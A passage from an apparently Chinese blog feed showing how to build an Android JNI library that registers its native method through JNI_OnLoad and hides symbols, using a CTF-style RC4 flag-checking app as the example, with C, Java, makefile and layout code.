class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">android &#123;</div><div class="line">       ......</div><div class="line">    sourceSets &#123;</div><div class="line">        main() &#123;</div><div class="line">            jniLibs.srcDirs = ['src/main/libs']</div><div class="line">            jni.srcDirs = [] <span class="comment">//屏蔽掉默认的jni编译生成过程</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>这时一个简单的输入结构:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">activity_main.xml</div><div class="line">&#123;</div><div class="line"></div><div class="line">    .....</div><div class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></div><div class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/input_flag"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginBottom</span>=<span class="string">"80dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginEnd</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginLeft</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginRight</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">"100dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:ems</span>=<span class="string">"10"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:inputType</span>=<span class="string">"textPersonName"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:hint</span>=<span class="string">"input your flag"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toTopOf</span>=<span class="string">"@+id/button"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">tools:ignore</span>=<span class="string">"UnknownId"</span> /&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">Button</span></span></div><div class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/input_ok"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"102dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"45dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginBottom</span>=<span class="string">"276dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginEnd</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginLeft</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginRight</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"确认"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintHorizontal_bias</span>=<span class="string">"0.458"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">tools:ignore</span>=<span class="string">"MissingConstraints"</span> /&gt;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>MainActivity结构<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</div><div class="line"><span class="keyword">import</span> android.os.Bundle;</div><div class="line"><span class="keyword">import</span> android.view.View;</div><div class="line"><span class="keyword">import</span> android.widget.Button;</div><div class="line"><span class="keyword">import</span> android.widget.EditText;</div><div class="line"><span class="keyword">import</span> android.widget.Toast;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line"></div><div class="line">        <span class="keyword">final</span> EditText sstr = (EditText) findViewById(R.id.input_flag);</div><div class="line">        <span class="keyword">final</span> Button ok = (Button) findViewById(R.id.input_ok);</div><div class="line"></div><div class="line">        ok.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</div><div class="line">                String st = sstr.getText().toString().trim();</div><div class="line"></div><div class="line">                String res = check.Check(st);</div><div class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>, res, Toast.LENGTH_SHORT).show();</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>运行就可以得到调用native方法的apk了。</p><h1 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h1><p>1.源码改动少，只需要添加JNI_Onload函数<br>2.无需加解密so，就可以实现混淆so中的JNI函数<br>3.后续可以添加so加解密，使破解难度更大</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;要逆向，必须会正向编写。so文件混淆——jni_load()——c++&lt;br&gt;
    
    </summary>
    
      <category term="android" scheme="http://yoursite.com/categories/android/"/>
    
    
  </entry>
  
  <entry>
    <title>JNI_Onload</title>
    <link href="http://yoursite.com/2018/07/10/android_9_jniLoad/"/>
    <id>http://yoursite.com/2018/07/10/android_9_jniLoad/</id>
    <published>2018-07-10T13:49:18.000Z</published>
    <updated>2018-07-18T12:56:38.858Z</updated>
    
    <content type="html"><![CDATA[<p>要逆向，必须会正向编写。so文件混淆——jni_load()<br><a id="more"></a></p><h1 id="JNI-Onload编写"><a href="#JNI-Onload编写" class="headerlink" title="JNI_Onload编写"></a>JNI_Onload编写</h1><p><a href="http://www.liuling123.com/2016/06/so_method_mix.html" target="_blank" rel="external">参考</a><br><a href="">上一篇</a>只是单纯的编写so文件，只要ida打开就可以直接看见方法名。这里对so进行简单的混淆，利用JNI_Onload()函数</p><h2 id="check-java"><a href="#check-java" class="headerlink" title="check.java"></a>check.java</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> com.example.ese.zjgsuctf;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">check</span> </span>&#123;</div><div class="line">    <span class="keyword">static</span> &#123;</div><div class="line">        System.loadLibrary(<span class="string">"check"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">static</span> String <span class="title">check</span><span class="params">(String sstr)</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="check-c"><a href="#check-c" class="headerlink" title="check.c"></a>check.c</h2><p>在jni目录创建一个check.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"com_example_ese_zjgsuctf_check.h"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> JNIREG_CLASS <span class="meta-string">"com/example/ese/zjgsuctf/check"</span><span class="comment">//指定要注册的类</span></span></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> longULONG;</div><div class="line"></div><div class="line"><span class="keyword">int</span> enc_key[]=&#123;<span class="number">89</span>,<span class="number">83</span>,<span class="number">94</span>,<span class="number">88</span>,<span class="number">68</span>,<span class="number">75</span>,<span class="number">87</span>,<span class="number">86</span>,<span class="number">76</span>,<span class="number">96</span>,<span class="number">86</span>,<span class="number">76</span>,<span class="number">96</span>,<span class="number">81</span>,<span class="number">80</span>,<span class="number">75</span>,<span class="number">96</span>,<span class="number">89</span>,<span class="number">83</span>,<span class="number">94</span>,<span class="number">88</span>,<span class="number">66</span>&#125;;</div><div class="line"><span class="keyword">int</span> enc_flag[]=&#123;<span class="number">0</span>, <span class="number">79</span>, <span class="number">216</span>, <span class="number">222</span>, <span class="number">132</span>, <span class="number">213</span>, <span class="number">175</span>, <span class="number">19</span>, <span class="number">82</span>, <span class="number">136</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">156</span>, <span class="number">179</span>, <span class="number">246</span>, <span class="number">113</span>, <span class="number">109</span>, <span class="number">5</span>, <span class="number">183</span>, <span class="number">122</span>&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></div><div class="line"><span class="function"> </span>&#123;</div><div class="line">     <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</div><div class="line">     <span class="keyword">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line">     <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</div><div class="line">     <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</div><div class="line">     &#123;</div><div class="line">         s[i] = i;</div><div class="line">         k[i] = key[i%Len];</div><div class="line">     &#125;</div><div class="line">     <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</div><div class="line">     &#123;</div><div class="line">         j = (j + s[i] + k[i]) % <span class="number">256</span>;</div><div class="line">         tmp = s[i];</div><div class="line">         s[i] = s[j];</div><div class="line">         s[j] = tmp;</div><div class="line">     &#125;</div><div class="line"> &#125;</div><div class="line"></div><div class="line"></div><div class="line"> <span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></div><div class="line"><span class="function"> </span>&#123;</div><div class="line">     <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</div><div class="line">     <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</div><div class="line">     <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</div><div class="line">     <span class="keyword">for</span> (k = <span class="number">0</span>; k&lt;Len; k++)</div><div class="line">     &#123;</div><div class="line">         i = (i + <span class="number">1</span>) % <span class="number">256</span>;</div><div class="line">         j = (j + s[i]) % <span class="number">256</span>;</div><div class="line">         tmp = s[i];</div><div class="line">         s[i] = s[j];</div><div class="line">         s[j] = tmp;</div><div class="line">         t = (s[i] + s[j]) % <span class="number">256</span>;</div><div class="line">         Data[k] ^= s[t];</div><div class="line">     &#125;</div><div class="line"> &#125;</div><div class="line"> <span class="function"><span class="keyword">void</span> <span class="title">ckeck_key</span><span class="params">(<span class="keyword">char</span> *k)</span></span></div><div class="line"><span class="function"> </span>&#123;</div><div class="line"></div><div class="line">     <span class="keyword">int</span> i,len = <span class="keyword">sizeof</span>(enc_key)/<span class="keyword">sizeof</span>(enc_key[<span class="number">0</span>]);</div><div class="line"></div><div class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</div><div class="line">     &#123;</div><div class="line">         k[i]=enc_key[i]^<span class="number">0x3f</span>;</div><div class="line"></div><div class="line">     &#125;</div><div class="line"></div><div class="line"> &#125;</div><div class="line"></div><div class="line"></div><div class="line"> <span class="function"><span class="keyword">int</span> <span class="title">crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *pData)</span></span></div><div class="line"><span class="function"> </span>&#123;</div><div class="line">     <span class="keyword">char</span> key[<span class="number">24</span>];</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> s[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line">    <span class="keyword">int</span> i,len = <span class="built_in">strlen</span>(pData);</div><div class="line"></div><div class="line">     ckeck_key(key);</div><div class="line">    key[<span class="number">22</span>]=<span class="string">'\0'</span>;</div><div class="line"></div><div class="line">     rc4_init(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)key, <span class="built_in">strlen</span>(key));</div><div class="line"></div><div class="line">     rc4_crypt(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</div><div class="line">        <span class="keyword">if</span>(pData[i]!=enc_flag[i])</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line"></div><div class="line"> &#125;</div><div class="line"></div><div class="line"><span class="comment">//JNI</span></div><div class="line">__attribute__((section (<span class="string">".mytext"</span>)))<span class="function">jstring <span class="title">esecheck</span><span class="params">( JNIEnv* env,jobject thiz,jstring str1)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="comment">//LOGV("This is esecheck()");</span></div><div class="line">         <span class="keyword">const</span> <span class="keyword">char</span> *str = (*env)-&gt;GetStringUTFChars(env, str1, <span class="literal">NULL</span>);</div><div class="line">            <span class="keyword">if</span>(str == <span class="literal">NULL</span>) &#123;</div><div class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">int</span> key = crypt(str);</div><div class="line"></div><div class="line">            <span class="keyword">char</span>* tmpstr = <span class="string">"succeeded"</span>;</div><div class="line">            <span class="keyword">if</span>(key)</div><div class="line">            &#123;</div><div class="line">                    jstring rtstr = (*env)-&gt;NewStringUTF(env, tmpstr);</div><div class="line">                    <span class="keyword">return</span> rtstr;</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    tmpstr = <span class="string">"failed!!"</span>;</div><div class="line">                    jstring rtstr = (*env)-&gt;NewStringUTF(env, tmpstr);</div><div class="line">                    <span class="keyword">return</span> rtstr;</div><div class="line">            &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">     <span class="comment">/**</span></div><div class="line"><span class="comment">     * Table of methods associated with a single class.</span></div><div class="line"><span class="comment">     */</span></div><div class="line"></div><div class="line"><span class="keyword">static</span> JNINativeMethod gMethods[] = &#123;<span class="comment">//绑定，注意，V,Z签名的返回值不能有分号“;”</span></div><div class="line">    &#123; <span class="string">"check"</span>, <span class="string">"(Ljava/lang/String;)Ljava/lang/String;"</span>, (<span class="keyword">void</span>*)esecheck&#125;,</div><div class="line">&#125;;</div><div class="line"></div><div class="line">     <span class="comment">/*</span></div><div class="line"><span class="comment">     * Register several native methods for one class.</span></div><div class="line"><span class="comment">     */</span></div><div class="line">     <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">registerNativeMethods</span><span class="params">(JNIEnv* env, <span class="keyword">const</span> <span class="keyword">char</span>* className,</span></span></div><div class="line"><span class="function"><span class="params">             JNINativeMethod* gMethods, <span class="keyword">int</span> numMethods)</span></span></div><div class="line"><span class="function">     </span>&#123;</div><div class="line">        jclass clazz;</div><div class="line">        clazz = (*env)-&gt;FindClass(env, className);</div><div class="line">        <span class="keyword">if</span> (clazz == <span class="literal">NULL</span>) &#123;</div><div class="line">            <span class="keyword">return</span> JNI_FALSE;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> ((*env)-&gt;RegisterNatives(env, clazz, gMethods, numMethods) &lt; <span class="number">0</span>) &#123;</div><div class="line">            <span class="keyword">return</span> JNI_FALSE;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> JNI_TRUE;</div><div class="line">     &#125;</div><div class="line"></div><div class="line">     <span class="comment">/*</span></div><div class="line"><span class="comment">     * Register native methods for all classes we know about.</span></div><div class="line"><span class="comment">     */</span></div><div class="line">     <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">registerNatives</span><span class="params">(JNIEnv* env)</span></span></div><div class="line"><span class="function">     </span>&#123;</div><div class="line">        <span class="keyword">if</span> (!registerNativeMethods(env, JNIREG_CLASS, gMethods,</div><div class="line">                                      <span class="keyword">sizeof</span>(gMethods) / <span class="keyword">sizeof</span>(gMethods[<span class="number">0</span>])))</div><div class="line">            <span class="keyword">return</span> JNI_FALSE;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> JNI_TRUE;</div><div class="line">     &#125;</div><div class="line"></div><div class="line">     <span class="comment">/*</span></div><div class="line"><span class="comment">     * Set some test stuff up.</span></div><div class="line"><span class="comment">     *</span></div><div class="line"><span class="comment">     * Returns the JNI version on success, -1 on failure.</span></div><div class="line"><span class="comment">     */</span></div><div class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="keyword">void</span>* reserved)</span></span></div><div class="line"><span class="function">     </span>&#123;</div><div class="line">        JNIEnv* env = <span class="literal">NULL</span>;</div><div class="line">        jint result = <span class="number">-1</span>;</div><div class="line"></div><div class="line"></div><div class="line">        <span class="keyword">if</span> ((*vm)-&gt;GetEnv(vm, (<span class="keyword">void</span>**) &amp;env, JNI_VERSION_1_4) != JNI_OK) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">        assert(env != <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (!registerNatives(env)) &#123;<span class="comment">//注册</span></div><div class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">/* success -- return valid version number */</span></div><div class="line">        result = JNI_VERSION_1_4;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> result;</div><div class="line">     &#125;</div></pre></td></tr></table></figure></p><h2 id="Android-mk"><a href="#Android-mk" class="headerlink" title="Android.mk"></a>Android.mk</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">LOCAL_PATH := $(call my-dir)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE := check</div><div class="line">LOCAL_SRC_FILES := check.c</div><div class="line">include $(BUILD_SHARED_LIBRARY)</div><div class="line">LOCAL_CFLAGS := -fvisibility=hidden    #隐藏符号表</div></pre></td></tr></table></figure><h2 id="Application-mk"><a href="#Application-mk" class="headerlink" title="Application.mk"></a>Application.mk</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">APP_ABI := all</div></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/lsong89/article/details/43152195" target="_blank" rel="external">JNINativeMethod gMethods[]</a></p><h1 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h1><p>在app目录下的build.gradle中添加<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">android &#123;</div><div class="line">       ......</div><div class="line">    sourceSets &#123;</div><div class="line">        main() &#123;</div><div class="line">            jniLibs.srcDirs = ['src/main/libs']</div><div class="line">            jni.srcDirs = [] <span class="comment">//屏蔽掉默认的jni编译生成过程</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>这时一个简单的输入结构:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">activity_main.xml</div><div class="line">&#123;</div><div class="line"></div><div class="line">    .....</div><div class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></div><div class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/input_flag"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginBottom</span>=<span class="string">"80dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginEnd</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginLeft</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginRight</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">"100dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:ems</span>=<span class="string">"10"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:inputType</span>=<span class="string">"textPersonName"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:hint</span>=<span class="string">"input your flag"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toTopOf</span>=<span class="string">"@+id/button"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">tools:ignore</span>=<span class="string">"UnknownId"</span> /&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">Button</span></span></div><div class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/input_ok"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"102dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"45dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginBottom</span>=<span class="string">"276dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginEnd</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginLeft</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginRight</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"确认"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintHorizontal_bias</span>=<span class="string">"0.458"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span 